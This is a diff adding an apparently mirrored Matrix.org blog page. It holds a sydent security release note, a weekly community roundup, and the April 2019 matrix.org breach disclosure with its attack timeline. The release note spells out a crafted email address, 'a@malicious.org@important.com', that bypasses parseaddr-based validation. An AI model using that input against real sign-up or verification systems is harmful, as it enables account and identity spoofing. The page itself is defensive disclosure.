+<li>sydent uses python's email.utils.parseaddr function to parse the input email address before sending validation mail to it, but it turns out that if you hand parseaddr an malformed email address of form a@b.com@c.com, it silently discards the @c.com prefix without error.  The result of this is that if one requested a validation token for 'a@malicious.org@important.com', the token would be sent to 'a@malicious.org', but the address 'a@malicious.org@important.com' would be marked as validated.  This release fixes this behaviour by asserting that the parsed email address is the same as the input email address.</li>
+<li>synapse's checking of email addresses relies on regular expressions in the home server configuration file. synapse does not validate email addresses before checking them against these regular expressions, so naive regular expressions will detect the second domain in email addresses such as the above, causing them to pass the check.</li>
+</ol>
+<p>You can get sydent 1.0.2 from <a href="https://github.com/matrix-org/sydent/releases/tag/v1.0.2">https://github.com/matrix-org/sydent/releases/tag/v1.0.2</a>.</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;04&#x2F;18&#x2F;this-week-in-matrix-2019-04-18&#x2F;" title="This Week in Matrix 2019-04-18">This Week in Matrix 2019-04-18</a></h1>
+            <span>
+                18.04.2019 00:00
+                —
+                <a href="/category/this-week-in-matrix">
+                    This Week in Matrix
+                </a>
+                —
+                
+                <a href="/author/matrix-org-team">
+                    Matrix.org Team
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <h2 id="welcome-to-the-new-blog">Welcome to the new blog!</h2>
+<p>Check out the new digs! We're happy with this newly deployed blog, and all the old and loveable content is right down there. If you find issues, <a href="https://matrix.to/#/@benpa:matrix.org">let me know</a>. You may remember Nad, from previous editions of Matrix Live - huge thanks to him for his work on the design and upkeep of this new deployment.</p>
+<h2 id="notes-from-the-downtimes">Notes from the downtimes</h2>
+<h3 id="github-tokens">Github tokens</h3>
+<p>jaywink:</p>
+<blockquote>
+<p>Due to the security incident, all GitHub access tokens for the Scalar GitHub integration were cleared. This means that if you have a GitHub bot in the channel and want to use the !github bot commands, you need to re-login to github via the integration manager menu. Note, existing webhooks are untouched and should work fine without re-authenticating.</p>
+</blockquote>
+<h3 id="bridges">Bridges</h3>
+<p><a href="https://matrix.to/#/@Half-Shot:half-shot.uk">Half-Shot</a>:</p>
+<blockquote>
+<p>From the matrix.org bridge team, we are resurrecting bridges as fast as possible. Currently running are the freenode, slack, gitter and gimpnet (now hosted on gnome.org) with more to come today and next week.<br />
+We have the snoonet and oftc irc bridges back. Mozilla is coming soon hopefully this weekend too!</p>
+</blockquote>
+<p>Whoop! Mozilla is actually up now!</p>
+<h2 id="pattle-new-release-on-f-droid">Pattle new release on F-Droid</h2>
+<p><a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a>:</p>
+<blockquote>
+<p>A big release of Pattle has just been pushed to the F-droid repo! Changes include:</p>
+<ul>
+<li>Display names are now shown</li>
+<li>You can now click on chats and view them!</li>
+<li>Messages are grouped by time and sender (see screenshots)</li>
+<li>Add fancy transition animation and ripples to chat messages (see video)</li>
+<li>Use Sentry for error reporting (only Android version and device model is sent, along with the stacktrace of the error)</li>
+</ul>
+<p>Also, please note that if you have a matrix.org you probably have reinstall the app if you're logged in because of the recent matrix.org incident (because there's no logout button yet and no detection for invalidated access tokens)</p>
+</blockquote>
+<p>There has actually been a release since, which includes:</p>
+<blockquote>
+<p>message sending and viewing image history!</p>
+</blockquote>
+<p><img src="/blog/pattle.2019-04-18.png" alt="" /></p>
+<h2 id="libqmatrixclient-0-5-1-2-quaternion-0-0-9-4">libQMatrixClient 0.5.1.2 &amp;&amp; Quaternion 0.0.9.4</h2>
+<p><a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a> is talking about the long road to 0.0.9.4:</p>
+<blockquote>
+<p><a href="https://github.com/QMatrixClient/libqmatrixclient">libQMatrixClient</a> 0.5.1.2 has been released, with all the remaining bugfixes for Quaternion 0.0.9.4 that's coming any day soon now. The release notes are here: <a href="https://github.com/QMatrixClient/libqmatrixclient/releases/tag/0.5.1.2">https://github.com/QMatrixClient/libqmatrixclient/releases/tag/0.5.1.2</a></p>
+</blockquote>
+<blockquote>
+<p>Quaternion 0.0.9.4 RC3, the last one before the release that will happen in the nearest days, is out. Release notes can be found at https://github.com/QMatrixClient/Quaternion/releases/tag/0.0.9.4-rc3. Translators, you literally have hours to add your translations for 0.0.9.4!</p>
+</blockquote>
+<h2 id="neo">neo</h2>
+<blockquote>
+<p>I reimplemented the matrix sdk into Neo, so it works nicer. Colors and font look nicer (base16-tomorrow, Open Sans), and there's text message sending, with localecho!<br />
+I also fixed a bug where react would recycle displayname-components across rooms, attributing them to the wrong messages</p>
+</blockquote>
+<p><img src="/blog/neo.2019-04-18.png" alt="" /></p>
+<blockquote>
+<p>a video at https://lain.haus/_matrix/media/v1/download/lain.haus/VfshWRfaNUnpGQbdkyYczxvd</p>
+</blockquote>
+<p>Go test Neo at: https://neo.lain.haus/neo</p>
+<h2 id="matrix-registration-update">matrix-registration update</h2>
+<p><a href="https://matrix.to/#/@zeratax:dmnd.sh">ZerataX</a>:</p>
+<blockquote>
+<p>it's been a long while, but I've finally come around to improving on matrix-registration<br />
+For those of you, who have forgotten what this project is about, it basically lets you invite people to your homeserver with tokens, e.g. https://homeserver.tld/register?token=DoubleWizardSky<br />
+This whole update was about making the project more user friendly.<br />
+I made a new default registration page that requires 0 setup and you can install the project right from pypi with pip, so you don't even need to clone the repo any longer.<br />
+check a live example  here: https://chat.dmnd.sh/register<br />
+and to play around with the api you can can go over to the github page: https://zeratax.github.io/matrix-registration/demo.html?token=ColorWhiskeyExpand<br />
+channel: <a href="https://matrix.to/#/#matrix-registration:dmnd.sh">#matrix-registration:dmnd.sh</a><br />
+github: https://github.com/zeratax/matrix-registration</p>
+</blockquote>
+<p><a href="https://matrix.org/_matrix/media/v1/download/dmnd.sh/UKGgpbHRdFXzKywxjjbfHAsI">Video available here.</a></p>
+<h2 id="matrix-media-repo-now-has-s3-support">matrix-media-repo now has s3 support</h2>
+<p><a href="https://github.com/turt2live">TravisR</a>:</p>
+<blockquote>
+<p><a href="https://github.com/turt2live/matrix-media-repo">matrix-media-repo</a> now has s3 (and s3-like) support, making it easier to archive older media or use minimal disk space. See the new datastores option in the config and the admin docs ( https://github.com/turt2live/matrix-media-repo/blob/master/docs/admin.md#datastore-management ) for more information.</p>
+</blockquote>
+<h2 id="dimension">Dimension</h2>
+<p><a href="https://github.com/turt2live">TravisR</a>:</p>
+<blockquote>
+<p>Dimension has been updated to more safely handle when upstream integration managers (like Scalar) are offline. Instead of crashing or breaking in various ways, it'll report which integrations are not accessible.<br />
+As well, due to recent events, if you use matrix.org bots or bridges in Dimension then go the the admin section and log everyone out using the red button. Dimension caches upstream tokens and isn't smart enough to realize that they are no longer valid, which means they need clearing. Clients should automatically handle getting new tokens in the background.</p>
+</blockquote>
+<h2 id="riot-ios">Riot iOS</h2>
+<blockquote>
+<ul>
+<li>Interactive device verification is still in progress</li>
+<li>Update WebRTC and Jitsi libs (in progress)</li>
+</ul>
+</blockquote>
+<h2 id="riot-android">Riot Android</h2>
+<blockquote>
+<p>*We are finalizing SAS device verification feature
+*We are preparing a release to fix some issues</p>
+</blockquote>
+<h2 id="riotx-android">RiotX (Android)</h2>
+<blockquote>
+<ul>
+<li>We can now clear the cache of the application (Riot legacy feature)</li>
+<li>Sync filter has been implemented</li>
+<li>François is working on thumbnail of video (upload and preview) in the timeline</li>
+</ul>
+</blockquote>
+<h2 id="that-s-all-i-know">That's all I know</h2>
+<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#TWIM:matrix.org">#twim:matrix.org</a> with your updates!</p>
+
+        </div>
+    </article>
+    
+    <article class="post">
+        <header>
+            <h1><a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;we-have-discovered-and-addressed-a-security-breach-updated-2019-04-12&#x2F;" title="We have discovered and addressed a security breach. (Updated 2019-04-12)">We have discovered and addressed a security breach. (Updated 2019-04-12)</a></h1>
+            <span>
+                11.04.2019 00:00
+                —
+                <a href="/category/general">
+                    General
+                </a>
+                —
+                
+                <a href="/author/matrix-org-team">
+                    Matrix.org Team
+                </a>
+                
+            </span>
+            
+        </header>
+        <div>
+            <p><b>Update: for the full story here, please see <a href="https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident">the post mortem</a>.</b>
+<br/></p>
+<h2 id="here-s-what-you-need-to-know">Here's what you need to know.</h2>
+<p><strong>TL;DR:</strong> An attacker gained access to the servers hosting Matrix.org. The intruder had access to the production databases, potentially giving them access to unencrypted message data, password hashes and access tokens. As a precaution, if you're a matrix.org user you should <strong>change your password now</strong>.</p>
+<p>The matrix.org homeserver has been rebuilt and is running securely; bridges and other ancillary services (e.g. this blog) will follow as soon as possible. Modular.im homeservers have not been affected by this outage.</p>
+<h3 id="the-security-breach-is-not-a-matrix-issue">The security breach is not a Matrix issue.</h3>
+<p>The hacker exploited a vulnerability in our production infrastructure (specifically a slightly outdated version of Jenkins). <strong>Homeservers other than matrix.org are unaffected.</strong></p>
+<h3 id="how-does-this-affect-me">How does this affect me?</h3>
+<p>We have invalidated all of the active access tokens for users on Matrix.org - all users have been logged out.</p>
+<p>Users with <strong>Matrix.org accounts</strong> should:</p>
+<ul>
+<li><strong>Change your password now</strong> - no plaintext Matrix passwords were leaked, but weak passwords could still be cracked from the hashed passwords</li>
+<li><strong>Change your NickServ password (if you're using IRC bridging)</strong> - there's no evidence bridge credentials were compromised, but if you have given the IRC bridges credentials to your NickServ account we would recommend changing this password</li>
+</ul>
+<p>And as a reminder, it's good practice to:</p>
+<ul>
+<li><strong>Review your device list regularly</strong> - make sure you recognise all of the devices connected to your account</li>
+<li><strong>Always make sure you enable E2E encryption for private conversations</strong></li>
+</ul>
+<h3 id="what-user-data-has-been-accessed">What user data has been accessed?</h3>
+<p>Forensics are ongoing; so far we've found no evidence of large quantities of data being downloaded. The attacker did have access to the production database, so unencrypted content (including private messages, password hashes and access tokens) may be compromised.</p>
+<h3 id="what-has-not-been-affected">What has not been affected?</h3>
+<ul>
+<li>Source code and packages have not been impacted based on our initial investigations.  However, we will be replacing signing keys as a precaution.</li>
+<li>Modular.im servers are not affected, based on our initial analysis</li>
+<li>Identity server data does not appear to have been compromised</li>
+</ul>
+<p>The target appeared to be internal credentials for onward exploits, not end user information from the matrix.org homeserver.</p>
+<h3 id="you-might-have-lost-access-to-your-encrypted-messages">You might have lost access to your encrypted messages.</h3>
+<p>As we had to log out all users from matrix.org, if you do not have backups of your encryption keys you will not be able to read your encrypted conversation history.  However, if you use server-side encryption key backup (the default in Riot these days) or take manual key backups, you’ll be okay.</p>
+<p>This was a difficult choice to make. We weighed the risk of some users losing access to encrypted messages against that of all users' accounts being vulnerable to hijack via the compromised access tokens. We hope you can see why we made the decision to prioritise account integrity over access to encrypted messages, but we're sorry for the inconvenience this may have caused.</p>
+<h2 id="what-happened">What happened?</h2>
+<p>We were using Jenkins for continuous integration (automatically testing our software). The version of Jenkins we were using had a vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003000">CVE-2019-1003000</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003001">CVE-2019-1003001</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1003002">CVE-2019-1003002</a>) which allowed an attacker to hijack credentials (forwarded ssh keys), giving access to our production infrastructure. Thanks to <a href="https://twitter.com/jaikeysarraf">@jaikeysarraf</a> for drawing this to our attention.</p>
+<h3 id="timeline">Timeline</h3>
+<p>March 13th <b>Updated 2019-04-12 11:00 UTC</b></p>
+<ul>
+<li>Attacker compromises Jenkins CI server</li>
+</ul>
+<p>April 4th <b>Updated 2019-04-12 11:00 UTC</b></p>
+<ul>
+<li>Attacker gains access to production infrastructure by hijacking a forwarded SSH agent logging into the compromised Jenkins worker</li>
+</ul>
+<p>April 9th</p>
+<ul>
+<li>Jenkins vulnerability brought to our attention by <a href="https://twitter.com/jaikeysarraf">@jaikeysarraf</a></li>
+</ul>
+<p>April 10th</p>
+<ul>
+<li>Investigation identified the compromised machines and the full scope of the attack</li>
+<li>Jenkins was removed</li>
+<li>Attacker's access to compromised machines was removed</li>
+</ul>
+<p>April 11th</p>
+<ul>
+<li>Matrix.org was taken offline and production infrastructure fully rebuilt</li>
+<li>Having fully flushed out the attacker, external communication was published informing users and advising on next steps</li>
+<li>Matrix.org homeserver restored, with bridges and ancillary services (e.g. this blog) following as soon as possible</li>
+</ul>
+<h2 id="update-2019-04-12">Update 2019-04-12</h2>
+<p>At around 5am UTC on Apr 12, the attacker used a cloudflare API key to repoint DNS for matrix.org to a defacement website (https://github.com/matrixnotorg/matrixnotorg.github.io).
+The API key was known compromised in the original attack, and during the rebuild the key was theoretically replaced.  However, unfortunately
+only personal keys were rotated, enabling the defacement.  We are currently doublechecking that all compromised secrets have been rotated.</p>
+<p>The rebuilt infrastructure itself is secure, however, and the DNS issue has been solved without further abuse.
+If you have already changed your password, you do not need to do so again.</p>
+<p>The defacement confirms that encrypted password hashes were exfiltrated from the production database, so <b>it is even more important
+for everyone to change their password</b>.  We will shortly be messaging and emailing all users to announce the breach and advise them
+to change their passwords.  We will also look at ways of non-destructively forcing a password reset at next login.</p>
+<p>The attacker has also posted github issues detailing some of their actions and suggested remediations at
+https://github.com/matrix-org/matrix.org/issues/created_by/matrixnotorg.</p>
+<p>This confirms that GPG keys used for signing packages were compromised.  These keys are used for signing
+the synapse debian repository (AD0592FE47F0DF61), and releases of Riot/Web (E019645248E8F4A1).
+Both keys have now been revoked.  The window of compromise for the keys started from April 4th; there have
+been no Synapse releases since then.  There has been one release of Riot/Web (1.0.7), however as the key
+was passphrased and based on our initial analysis of the release, we believe it to be secure.</p>
+<h2 id="what-are-we-doing-to-prevent-this-in-future">What are we doing to prevent this in future?</h2>
+<p>Once things are back up and running we will retrospect on this incident in detail to identify the changes we need to make. We will provide a proper postmortem, including follow-up steps; meanwhile we are obviously going to take measures to improve the security of our production infrastructure, including patching services more aggressively and more regular vulnerability scans.</p>
+
+        </div>
+    </article>
+    
+    <nav class="pagination">
+    <div class="prev">
+        
+        <a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;page&#x2F;51&#x2F;">‹ Previous</a>
+        
+    </div>
+    <span class="page-number">52 / 79</span>
+    <div class="prev">
+        
+        <a href="https:&#x2F;&#x2F;tune-your-chat.github.io&#x2F;blog&#x2F;page&#x2F;53&#x2F;">Next ›</a>
+        
+    </div>
+</nav>
+
+</div>
+    </main>
+
+    <footer class="site-footer">
+    <div class="internal-links">
+        
+        <a href="&#x2F;support">Donate</a>
+        
+        <a href="https:&#x2F;&#x2F;shop.matrix.org">Shop</a>
+        
+        <a href="&#x2F;security-disclosure-policy">Security Disclosure Policy</a>
+        
+        <a href="&#x2F;security-hall-of-fame">Security Hall of Fame</a>
+        
+        <a href="&#x2F;legal&#x2F;code-of-conduct">Code of Conduct</a>
+        
+        <a href="&#x2F;legal">Legal</a>
+        
+        <a href="&#x2F;contact">Contact</a>
+        
+        <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;">Site Source</a>
+        
+    </div>
+    <div class="external-links">
+        <div>
+            
+            <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org" rel="me"><img src="/assets/github.svg" alt="GitHub"></a>
+            
+            <a href="https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;" rel="me"><img src="/assets/gitlab.svg" alt="GitLab"></a>
+            
+            <a href="https:&#x2F;&#x2F;mastodon.matrix.org&#x2F;@matrix" rel="me"><img src="/assets/mastodon.svg" alt="Mastodon"></a>
+            
+            <a href="https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg" rel="me"><img src="/assets/twitter.svg" alt="Twitter"></a>
+            
+            <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCVFkW-chclhuyYRbmmfwt6w" rel="me"><img src="/assets/youtube.svg" alt="YouTube"></a>
+            
+            <a href="&#x2F;atom.xml" rel="me"><img src="/assets/rss.svg" alt="RSS"></a>
+            
+        </div>
+    </div>
+    <p><a href="/legal/copyright-notice">Copyright Notice</a></p>
+</footer>
+
+</body>
+
+</html>
